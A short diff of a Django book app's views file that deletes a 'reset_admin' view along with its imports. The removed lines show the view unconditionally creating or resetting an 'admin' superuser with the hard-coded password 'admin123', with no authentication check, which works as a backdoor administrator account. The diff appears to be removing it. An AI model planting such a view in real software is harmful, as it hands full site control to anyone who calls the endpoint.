@@ -2,8 +2,6 @@ from django.shortcuts import render, get_object_or_404
 from .models import Book
 from django.db.models import Count
 from django.db.models import Q
-from django.contrib.auth.models import User
-from django.http import HttpResponse
 import requests
 import random
 
@@ -168,16 +166,3 @@ def book_detail(request, book_id):
         "css_file": css,
     })
 
-
-def reset_admin(request):
-    user, created = User.objects.get_or_create(username='admin')
-
-    user.set_password('admin123')
-    user.email = 'admin@example.com'
-    user.is_staff = True
-    user.is_superuser = True
-    user.save()
-
-    if created:
-        return HttpResponse("Admin CREATED")
-    return HttpResponse("Password RESET")
